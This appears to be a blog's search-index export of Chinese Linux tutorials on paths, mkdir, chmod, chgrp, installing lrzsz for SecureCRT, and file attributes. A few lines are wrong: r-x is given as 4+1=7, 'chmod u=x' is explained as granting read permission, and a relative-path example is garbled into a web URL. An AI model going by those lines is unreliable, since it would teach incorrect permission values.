&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果我们将整个目录树以图的方法来显示，并且将较为重要的文件数据列出来的话，那么目录树架构就如下图所示： 五、绝对路径与相对路径&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了需要特别注意的FHS目录配置外，在文件名部分我们也要特别注意。因为根据档名写法的不同，也可将所谓的路径(path)定义为绝对路径(absolute)与相对路径(relative)。 这两种文件名/路径的写法依据是这样的： 绝对路径：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由根目录(/)开始写起的文件名或目录名称， 例如 /home/dmtsai/.bashrc； 相对路径：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;相对于目前路径的文件名写法。 例如 ./home/dmtsai 或 http://www.cnblogs.com/home/dmtsai/ 等等。反正开头不是 / 就属于相对路径的写法 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而你必须要了解，相对路径是以你当前所在路径的相对位置来表示的。举例来说，你目前在 /home 这个目录下， 如果想要进入 /var/log 这个目录时，可以怎么写呢？ 12cd /var/log (absolute)cd ../var/log (relative) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为你在 /home 底下，所以要回到上一层 (../) 之后，才能继续往 /var 来移动的，特别注意这两个特殊的目录： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;. ：代表当前的目录，也可以使用 ./ 来表示； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.. ：代表上一层目录，也可以 ../ 来代表。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个 . 与 .. 目录概念是很重要的，你常常会看到 cd .. 或 ./command 之类的指令下达方式， 就是代表上一层与目前所在目录的工作状态。 使用实例实例1：如何先进入/var/spool/mail/目录，再进入到/var/spool/cron/目录内？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 12cd /var/spool/mailcd ../cron &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于/var/spool/mail与/var/spool/cron是同样在/var/spool/目录中。如此就不需要在由根目录开始写起了。这个相对路径是非常有帮助的，尤其对于某些软件开发商来说。 一般来说，软件开发商会将数据放置到/usr/local/里面的各相对目录。 但如果用户想要安装到不同目录呢？就得要使用相对路径。 实例2：网络文件常常提到类似./run.sh之类的数据，这个指令的意义为何？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于指令的执行需要变量的支持，若你的执行文件放置在本目录，并且本目录并非正规的执行文件目录(/bin, /usr/bin等为正规)，此时要执行指令就得要严格指定该执行档。./代表本目录的意思，所以./run.sh代表执行本目录下， 名为run.sh的文件。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- mkdir]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F3.%20Linux%20%E5%91%BD%E4%BB%A4-mkdir%2F</url>
    <content type="text"><![CDATA[Linux 命令-mkdir&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux mkdir 命令用来创建指定的名称的目录，要求创建目录的用户在当前目录中具有写权限，并且指定的目录名不能是当前目录中已有的目录。 1．命令格式：1mkdir [选项] [目录] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过 mkdir 命令可以实现在指定位置创建以 DirName(指定的文件名)命名的文件夹或目录。要创建文件夹或目录的用户必须对所创建的文件夹的父文件夹具有写权限。并且，所创建的文件夹(目录)不能与其父目录(即父文件夹)中的文件名重名，即同一个目录下不能有同名的(区分大小写)。 3．命令参数： -m, –mode=模式，设定权限&lt;模式&gt; (类似 chmod)，而不是 rwxrwxrwx 减 umask -p, –parents 可以是一个路径名称。此时若路径中的某些目录尚不存在,加上此选项后,系统将自动建立好那些尚不存在的目录,即一次可以建立多个目录; -v, –verbose 每次创建新目录都显示信息 –help 显示此帮助信息并退出 –version 输出版本信息并退出 4．命令实例：实例1：创建一个空目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345[root@localhost soft]# cd test[root@localhost test]# mkdir test1[root@localhost test]# ll总计 4drwxr-xr-x 2 root root 4096 10-25 17:42 test1[root@localhost test]# 实例2：递归创建多个目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir -p test2/test22 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# mkdir -p test2/test22[root@localhost test]# ll总计 8drwxr-xr-x 2 root root 4096 10-25 17:42 test1drwxr-xr-x 3 root root 4096 10-25 17:44 test2[root@localhost test]# cd test2/[root@localhost test2]# ll总计 4drwxr-xr-x 2 root root 4096 10-25 17:44 test22[root@localhost test2]# 实例3：创建权限为777的目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir -m 777 test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost test]# mkdir -m 777 test3[root@localhost test]# ll总计 12drwxr-xr-x 2 root root 4096 10-25 17:42 test1drwxr-xr-x 3 root root 4096 10-25 17:44 test2drwxrwxrwx 2 root root 4096 10-25 17:46 test3[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test3 的权限为rwxrwxrwx 实例4：创建新目录都显示信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir -v test4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost test]# mkdir -v test4mkdir: 已创建目录 “test4”[root@localhost test]# mkdir -vp test5/test5-1mkdir: 已创建目录 “test5”mkdir: 已创建目录 “test5/test5-1”[root@localhost test]# 实例5：一个命令创建项目的目录结构&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参考：UNIX 高手的 10 个习惯 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir -vp scf/&#123;lib/,bin/,doc/&#123;info,product&#125;,logs/&#123;info,product&#125;,service/deploy/&#123;info,product&#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112131415161718192021222324252627282930[root@localhost test]# mkdir -vp scf/&#123;lib/,bin/,doc/&#123;info,product&#125;,logs/&#123;info,product&#125;,service/deploy/&#123;info,product&#125;&#125;mkdir: 已创建目录 “scf”mkdir: 已创建目录 “scf/lib”mkdir: 已创建目录 “scf/bin”mkdir: 已创建目录 “scf/doc”mkdir: 已创建目录 “scf/doc/info”mkdir: 已创建目录 “scf/doc/product”mkdir: 已创建目录 “scf/logs”mkdir: 已创建目录 “scf/logs/info”mkdir: 已创建目录 “scf/logs/product”mkdir: 已创建目录 “scf/service”mkdir: 已创建目录 “scf/service/deploy”mkdir: 已创建目录 “scf/service/deploy/info”mkdir: 已创建目录 “scf/service/deploy/product”[root@localhost test]# tree scf/scf/|-- bin|-- doc| |-- info| `-- product|-- lib|-- logs| |-- info| `-- product`-- service `-- deploy |-- info `-- product12 directories, 0 files[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- chmod]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F27.%20Linux%20%E5%91%BD%E4%BB%A4-%20chmod%2F</url>
    <content type="text"><![CDATA[Linux 命令- chmod&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chmod命令用于改变linux系统文件或目录的访问权限。用它控制文件或目录的访问权限。该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的每个文件和目录都有访问许可权限，用它来确定谁可以通过何种方式对文件和目录进行访问和操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件或目录的访问权限分为只读，只写和可执行三种。以文件为例，只读权限表示只允许读其内容，而禁止对其做任何的更改操作。可执行权限表示允许将该文件作为一个程序执行。文件被创建时，文件所有者自动拥有对该文件的读、写和可执行权限，以便于对文件的阅读和修改。用户也可根据需要把访问权限设置为需要的任何组合。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有三种不同类型的用户可对文件或目录进行访问：文件所有者，同组用户、其他用户。所有者一般是文件的创建者。所有者可以允许同组用户有权访问文件，还可以将文件的访问权限赋予系统中的其他用户。在这种情况下，系统中每一位用户都能访问该用户拥有的文件或目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一文件或目录的访问权限都有三组，每组用三位表示，分别为文件属主的读、写和执行权限；与属主同组的用户的读、写和执行权限；系统中其他用户的读、写和执行权限。当用ls -l命令显示文件或目录的详细信息时，最左边的一列为文件的访问权限。 例如： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ls -al &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost test]# ll -al总计 316lrwxrwxrwx 1 root root 11 11-22 06:58 linklog.log -&gt; log2012.log-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log-rw-r--r-- 1 root root 0 11-16 14:41 log2016.log-rw-r--r-- 1 root root 0 11-16 14:43 log2017.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以log2012.log为例： 1-rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一列共有10个位置，第一个字符指定了文件类型。在通常意义上，一个目录也是一个文件。如果第一个字符是横线，表示是一个非目录的文件。如果是d，表示是一个目录。从第二个字符开始到第十个共9个字符，3个字符一组，分别表示了3组用户对文件或者目录的权限。权限字符用横线代表空许可，r代表只读，w代表写，x代表可执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如： 1- rw- r-- r-- &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示log2012.log是一个普通文件；log2012.log的属主有读写权限；与log2012.log属主同组的用户只有读权限；其他用户也只有读权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;确定了一个文件的访问权限后，用户可以利用Linux系统提供的chmod命令来重新设定不同的访问权限。也可以利用chown命令来更改某个文件或目录的所有者。利用chgrp命令来更改某个文件或目录的用户组。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chmod命令是非常重要的，用于改变文件或目录的访问权限。用户用它控制文件或目录的访问权限。chmod命令详细情况如下。 1.命令格式1chmod [-cfvR] [--help] [--version] mode file 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于改变文件或目录的访问权限，用它控制文件或目录的访问权限。 3.命令参数必要参数 -c 当发生改变时，报告处理信息 -f 错误信息不输出 -R 处理指定目录以及其子目录下的所有文件 -v 运行时显示详细处理信息 选择参数 –reference=&lt;目录或者文件&gt; 设置成具有指定目录或者文件具有相同的权限 –version 显示版本信息 &lt;权限范围&gt;+&lt;权限设置&gt; 使权限范围内的目录或者文件具有指定的权限 &lt;权限范围&gt;-&lt;权限设置&gt; 删除权限范围的目录或者文件的指定权限 &lt;权限范围&gt;=&lt;权限设置&gt; 设置权限范围内的目录或者文件的权限为指定的值 权限范围 u ：目录或者文件的当前的用户 g ：目录或者文件的当前的群组 o ：除了目录或者文件的当前用户或群组之外的用户或者群组 a ：所有的用户及群组 权限代号 r ：读权限，用数字4表示 w ：写权限，用数字2表示 x ：执行权限，用数字1表示 ：删除权限，用数字0表示 s ：特殊权限 该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。 文字设定法1chmod [who] [+|-|=] [mode] [filename] 数字设定法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们必须首先了解用数字表示的属性的含义：0表示没有权限，1表示可执行权限，2表示可写权限，4表示可读权限，然后将其相加。所以数字属性的格式应为3个从0到7的八进制数，其顺序是（u）（g）（o）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，如果想让某个文件的属主有“读/写”二种权限，需要把4（可读）+2（可写）＝6（读/写）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数字设定法的一般形式为： 1chmod [mode] [filename] 数字与字符对应关系如下&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;r=4，w=2，x=1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要rwx属性则4+2+1=7 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要rw-属性则4+2=6； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要r-x属性则4+1=7。 4.使用实例实例1：增加文件所有用户组可执行权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod a+x log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# ls -al log2012.log -rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chmod a+x log2012.log [root@localhost test]# ls -al log2012.log -rwxr-xr-x 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即设定文件log2012.log的属性为：文件属主（u） 增加执行权限；与文件属主同组用户（g） 增加执行权限；其他用户（o） 增加执行权限。 实例2：同时修改不同用户权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod ug+w,o-x log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ls -al log2012.log -rwxr-xr-x 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chmod ug+w,o-x log2012.log [root@localhost test]# ls -al log2012.log -rwxrwxr-- 1 root root 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即设定文件log2012.log的属性为：文件属主（u） 增加写权限;与文件属主同组用户（g） 增加写权限;其他用户（o） 删除执行权限 实例3：删除文件权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod a-x log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ls -al log2012.log -rwxrwxr-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chmod a-x log2012.log [root@localhost test]# ls -al log2012.log -rw-rw-r-- 1 root root 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除所有用户的可执行权限 实例4：使用 “=” 设置权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod u=x log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ls -al log2012.log -rw-rw-r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chmod u=x log2012.log [root@localhost test]# ls -al log2012.log ---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;撤销原来所有的权限，然后使拥有者具有可读权限 实例5：对一个目录及其子目录所有文件添加权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod -R u+x test4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost test]# cd test4[root@localhost test4]# ls -al总计 312drwxrwxr-x 2 root root 4096 11-13 05:50 .drwxr-xr-x 5 root root 4096 11-22 06:58 ..-rw-r--r-- 1 root root 302108 11-12 22:54 log2012.log-rw-r--r-- 1 root root 61 11-12 22:54 log2013.log-rw-r--r-- 1 root root 0 11-12 22:54 log2014.log[root@localhost test4]# cd ..[root@localhost test]# chmod -R u+x test4[root@localhost test]# cd test4[root@localhost test4]# ls -al总计 312drwxrwxr-x 2 root root 4096 11-13 05:50 .drwxr-xr-x 5 root root 4096 11-22 06:58 ..-rwxr--r-- 1 root root 302108 11-12 22:54 log2012.log-rwxr--r-- 1 root root 61 11-12 22:54 log2013.log-rwxr--r-- 1 root root 0 11-12 22:54 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;递归地给test4目录下所有文件和子目录的属主分配权限 其他一些实例1.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod 751 file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给 file 的属主分配读、写、执行（7）的权限，给 file 的所在组分配读、执行（5）的权限，给其他用户分配执行（1）的权限 2.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod u=rwx,g=rx,o=x file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例的另一种形式 3.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod a=r file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为所有用户分配读权限 4.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod 444 file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同上例 5.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod a-wx,a+r file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同上例]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- chgrp]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F29.%20Linux%20%E5%91%BD%E4%BB%A4-%20chgrp%2F</url>
    <content type="text"><![CDATA[Linux 命令- chgrp&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 Linux 系统里，文件或目录的权限的掌控以拥有者及所属群组来管理。可以使用 chgrp 指令变更文件与目录所属群组，这种方式采用群组名称或群组织识别码都可以。chgrp 命令就是 change group 的缩写！要被改变的组名必须要在 /etc/group 文件被存在才行。 1.命令格式1chgrp [选项] [组] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chgrp 命令可采用群组名称或群组织识别码的方式改变文件或目录的所属群组。使用权限是超级用户。 3.命令参数必要参数 -c 当发生改变时输出调试信息 -f 不显示错误信息 -R 处理指定目录以及其子目录下的所有文件 -v 运行时显示详细的处理信息 –dereference 作用于符号链接的指向，而不是符号链接本身 –no-dereference 作用于符号链接本身 选择参数 –reference=&lt;文件或者目录&gt; –help 显示帮助信息 –version 显示版本信息 使用实例实例1：改变文件的群组属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chgrp -v bin log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# ll---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chgrp -v bin log2012.log“log2012.log” 的所属组已更改为 bin[root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将 log2012.log 文件由 root 群组该为 bin 群组 实例2：根据指定未见改变文件的群组属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chgrp --reference=log2012.log log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log[root@localhost test]# chgrp --reference=log2012.log log2013.log [root@localhost test]# ll---xrw-r-- 1 root bin 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root bin 61 11-13 06:03 log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改变文件 log2013.log 的群组属性，是的文件 log2013.log 的群组属性和参考文件 log2012.log 的群组属性相同 实例3.改变指定目录以及其子目录下的所有文件的群组属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chgrp -R bin test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test]# lldrwxr-xr-x 2 root root 4096 11-30 08:39 test6[root@localhost test]# cd test6[root@localhost test6]# ll---xr--r-- 1 root root 302108 11-30 08:39 linklog.log---xr--r-- 1 root root 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root root 61 11-30 08:39 log2013.log-rw-r--r-- 1 root root 0 11-30 08:39 log2014.log-rw-r--r-- 1 root root 0 11-30 08:39 log2015.log-rw-r--r-- 1 root root 0 11-30 08:39 log2016.log-rw-r--r-- 1 root root 0 11-30 08:39 log2017.log[root@localhost test6]# cd ..[root@localhost test]# chgrp -R bin test6[root@localhost test]# cd test6[root@localhost test6]# ll---xr--r-- 1 root bin 302108 11-30 08:39 linklog.log---xr--r-- 1 root bin 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root bin 61 11-30 08:39 log2013.log-rw-r--r-- 1 root bin 0 11-30 08:39 log2014.log-rw-r--r-- 1 root bin 0 11-30 08:39 log2015.log-rw-r--r-- 1 root bin 0 11-30 08:39 log2016.log-rw-r--r-- 1 root bin 0 11-30 08:39 log2017.log[root@localhost test6]# cd ..[root@localhost test]# lldrwxr-xr-x 2 root bin 4096 11-30 08:39 test6[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;改变指定目录以及其子目录下的所有文件的群组属性 实例4.通过群组织识别码改变文件群组属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chgrp -R 100 test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost test]# chgrp -R 100 test6[root@localhost test]# lldrwxr-xr-x 2 root users 4096 11-30 08:39 test6[root@localhost test]# cd test6[root@localhost test6]# ll---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过群识别码改变文件群组属性，100为 users 群组的识别码，具体群组和群组识别码可以去 /etc/group 文件中查看]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用 SecureCRT 来上传和下载文件]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F26.%20%E7%94%A8%20SecureCRT%20%E6%9D%A5%E4%B8%8A%E4%BC%A0%E5%92%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[用 SecureCRT 来上传和下载文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用SSH管理linux服务器时经常需要远程与本地之间交互文件.而直接用SecureCRT自带的上传下载功能无疑是最方便的，SecureCRT下的文件传输协议有ASCII、Xmodem、Zmodem。 文件传输协议：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件传输是数据交换的主要形式。在进行文件传输时，为使文件能被正确识别和传送，我们需要在两台计算机之间建立统一的传输协议。这个协议包括了文件的识别、传送的起止时间、错误的判断与纠正等内容。常见的传输协议有以下几种： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ASCII：这是最快的传输协议，但只能传送文本文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Xmodem：这种古老的传输协议速度较慢，但由于使用了CRC错误侦测方法，传输的准确率可高达99.6%。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ymodem：这是Xmodem的改良版，使用了1024位区段传送，速度比Xmodem要快 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Zmodem：Zmodem采用了串流式（streaming）传输方式，传输速度较快，而且还具有自动改变区段大小和断点续传、快速错误侦测等功能。这是目前最流行的文件传输协议。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除以上几种外，还有Imodem、Jmodem、Bimodem、Kermit、Lynx等协议，由于没有多数厂商支持，这里就略去不讲。 SecureCRT可以使用linux下的zmodem协议来快速的传送文件,使用非常方便.具体步骤：一．在使用SecureCRT上传下载之前需要给服务器安装lrzsz：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、从下面的地址下载 lrzsz-0.12.20.tar.gz 1wget http://down1.chinaunix.net/distfiles/lrzsz-0.12.20.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、查看里面的INSTALL文档了解安装参数说明和细节 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3、解压文件 1tar zxvf lrzsz-0.12.20.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;4、进入目录 1cd lrzsz-0.12.20 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5、配置安装文件 1./configure --prefix=/usr/local/lrzsz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;6、编译 1make &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;7、安装 1make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;8、建立软链接 123#cd /usr/bin#ln -s /usr/local/lrzsz/bin/lrz rz#ln -s /usr/local/lrzsz/bin/lsz sz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;9、测试 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行 rz 弹出SecureCRT上传窗口,用SecureCRT来上传和下载文件。 二．设置SecureCRT上传和下载的默认目录就行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;options-&gt;session options -&gt;Terminal-&gt;Xmodem/Zmodem 下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在右栏directory设置上传和下载的目录 三．使用Zmodem从客户端上传文件到linux服务器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1.在用SecureCRT登陆linux终端. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.选中你要放置上传文件的路径，在目录下然后输入rz命令,SecureCRT会弹出文件选择对话框，在查找范围中找到你要上传的文件，按Add按钮。然后OK就可以把文件上传到linux上了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者在Transfer-&gt;Zmodem Upoad list弹出文件选择对话框，选好文件后按Add按钮。然后OK窗口自动关闭。然后在linux下选中存放文件的目录，输入rz命令。liunx就把那个文件上传到这个目录下了。 四．使用Zmodem下载文件到客户端：1sz filename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zmodem接收可以自行启动.下载的文件存放在你设定的默认下载目录下. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rz，sz是Linux/Unix同Windows进行ZModem文件传输的命令行工具windows端需要支持ZModem的telnet/ssh客户端，SecureCRT就可以用SecureCRT登陆到Unix/Linux主机（telnet或ssh均可）O 运行命令rz，即是接收文件，SecureCRT就会弹出文件选择对话框，选好文件之后关闭对话框，文件就会上传到当前目录 O 运行命令sz file1 file2就是发文件到windows上（保存的目录是可以配置） 比ftp命令方便多了，而且服务器不用再开FTP服务了]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件属性详解]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F25.%20Linux%20%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Linux 文件属性详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 文件或目录的属性主要包括：文件或目录的节点、种类、权限模式、链接数量、所归属的用户和用户组、最近访问或修改的时间等内容。具体情况如下： 命令1ls -lih 输出123456789101112[root@localhost test]# ls -lih总计 316K2095120 lrwxrwxrwx 1 root root 11 11-22 06:58 linklog.log -&gt; log2012.log2095112 -rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log2095110 -rw-r--r-- 1 root root 61 11-13 06:03 log2013.log2095107 -rw-r--r-- 1 root root 0 11-13 06:03 log2014.log2095117 -rw-r--r-- 1 root root 0 11-13 06:06 log2015.log2095118 -rw-r--r-- 1 root root 0 11-16 14:41 log2016.log2095119 -rw-r--r-- 1 root root 0 11-16 14:43 log2017.log2095113 drwxr-xr-x 6 root root 4.0K 10-27 01:58 scf2095109 drwxrwxr-x 2 root root 4.0K 11-13 06:08 test32095131 drwxrwxr-x 2 root root 4.0K 11-13 05:50 test4 说明 第一列：inode 第二列：文件种类和权限； 第三列： 硬链接个数； 